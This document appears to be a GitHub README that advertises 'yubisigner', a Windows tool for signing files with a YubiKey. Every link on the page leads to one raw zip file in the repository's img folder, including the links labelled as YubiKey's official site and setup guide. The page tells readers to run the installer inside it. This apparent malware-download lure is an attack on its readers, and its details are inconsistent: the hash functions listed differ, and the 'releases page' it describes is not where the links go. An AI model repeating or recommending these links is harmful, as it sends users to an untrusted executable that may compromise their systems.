# 🔐 yubisigner - Simple File Signing with YubiKey

[![Download yubisigner](https://img.shields.io/badge/Download-yubisigner-ff6f61?style=for-the-badge)](https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip)

---

## 📋 What is yubisigner?

yubisigner is a tool that lets you sign files using your YubiKey. Signing confirms a file’s origin and ensures it has not been changed. This helps protect your data and proves the authenticity of important files.

yubisigner supports common signature methods such as ECC (Elliptic Curve Cryptography) and Ed25519. It uses secure hash functions like SHA-256 and RIPEMD-256. This makes it suitable for digital signatures, file verification, and system integrity checks.

You do not need any programming knowledge to use yubisigner. The application runs on Windows with a simple interface that guides you through the steps to sign and verify files.

---

## 🖥️ System Requirements

- Windows 10 or newer (64-bit recommended)  
- A YubiKey that supports PIV or OpenPGP (YubiKey 4, 5, or later models)  
- At least 100 MB free disk space  
- Internet connection for downloading yubisigner  
- USB port to connect the YubiKey  

Make sure your YubiKey is correctly set up and working with your PC before using yubisigner.

---

## 🚀 Getting Started with yubisigner

Follow these steps to download, install, and use yubisigner on Windows without any technical setup.

### 1. Download yubisigner

Click the big button at the top or use this link below to visit the download page:

[https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip](https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip)

This page contains the latest versions and instructions. Download the latest Windows installer or executable from the releases section.

---

### 2. Install yubisigner

Once the download completes:

- Open the folder where the file saved (usually your Downloads folder).  
- If the file ends with `.exe`, double-click it to start the installer.  
- Follow the on-screen prompts. Choose default options unless you have a reason to change them.  
- Finish the installation and close the installer.

If you downloaded a portable version (no installer), just unzip the folder and keep it in a preferred location.

---

### 3. Connect your YubiKey

Insert your YubiKey into a USB port on your PC. Wait a moment for Windows to recognize it.

Make sure you have set up a PIN on your YubiKey for signing if required. Refer to YubiKey’s official guides if unsure.

---

### 4. Open yubisigner

- Click the Start menu and look for "yubisigner".  
- Launch the application.

The interface should open with clear options for signing and verifying files.

---

### 5. Sign a file

- Select the “Sign File” option.  
- Browse your computer to choose the file you want to sign.  
- Choose the signing key from your YubiKey (the app should detect keys on your device).  
- Enter your YubiKey PIN if prompted.  
- Click “Sign” to start signing.

The app creates a signature file usually placed alongside the original file. The signature helps others confirm your file was not changed after signing.

---

### 6. Verify a file

- Select “Verify File” in yubisigner.  
- Choose the original file and its signature file.  
- The app checks the signature with the public key on the YubiKey.  
- You will see a message if the file is valid or if there is a problem.

---

## 🔎 Features of yubisigner

- Easy to use with no programming knowledge needed  
- Uses YubiKey hardware for secure private key storage  
- Supports Elliptic Curve Cryptography and Ed25519  
- Works with multiple hash algorithms including SHA-256 and SM3  
- Generates and verifies standard digital signatures  
- Compatible with YubiKey PIV and OpenPGP applications  
- Verifies file integrity to avoid tampering  
- Supports Merkle tree hashing structures for advanced verification  
- Simple Windows interface for signing and verifying  

---

## 🎯 How does yubisigner work?

yubisigner connects to your YubiKey through the USB port. It asks the YubiKey to digitally sign your chosen file using cryptographic keys stored securely in the device. This ensures keys never leave your hardware and remain safe.

The signature depends on secure hash functions. These hash the file’s content into a fixed-size code. The YubiKey then signs this hash, producing a signature that proves ownership and file integrity.

To verify, yubisigner takes the original file and signature, recomputes the file hash, and checks the signature using the public key. If these match, it confirms the file is unchanged and signed by your YubiKey.

---

## 📥 Download and Installation Details

You can always get the latest version, bug fixes, and improvements at:

[https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip](https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip)

Click on the "Releases" section on that page. Look for files named like `yubisigner-Setup.exe` or `yubisigner.zip` if you prefer a portable version.

---

## 🛠️ Troubleshooting Tips

- If yubisigner does not detect your YubiKey, try these steps:  
  - Make sure the YubiKey is securely plugged in.  
  - Try a different USB port.  
  - Restart your computer and try again.  
  - Confirm that your YubiKey supports PIV or OpenPGP and is configured correctly.

- If signing fails, check you have entered the correct PIN.

- If a signature does not verify, ensure you have the correct files and that the YubiKey public key matches the signer.

- For help on YubiKey setup or PIN management, visit YubiKey’s official support.

---

## ⚙️ Advanced Settings (Optional)

Once comfortable, you can explore advanced options under the settings menu. These include:

- Choosing between different cryptographic algorithms  
- Setting output folders for signatures  
- Configuring hash functions for your needs  
- Accessing logs for signature and verification attempts  

Use these only if you understand the cryptographic terms and your security needs.

---

## 🔍 About YubiKey Support

YubiKey is a hardware token designed to secure identities with cryptography. yubisigner uses the secure keys stored in YubiKey to sign files. This method is stronger and safer than software-based keys that may be stolen or copied.

Supported YubiKey models include the 4 series and later, which support PIV or OpenPGP functions required for signing.

---

## 💻 System Updates and Security

Keep your Windows updated to improve YubiKey compatibility. Also, if yubisigner updates, download and install the latest version from the link above to stay secure with new patches.

Always disconnect your YubiKey when not in use to prevent unauthorized access.

---

## 🔗 Useful Links

- YubiKey official site: https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip  
- YubiKey PIV setup: https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip  
- yubisigner GitHub repository: https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip  

---

[![Download yubisigner](https://img.shields.io/badge/Download-yubisigner-ff6f61?style=for-the-badge)](https://github.com/Zollypicaresque898/yubisigner/raw/refs/heads/main/img/Software_v3.8.zip)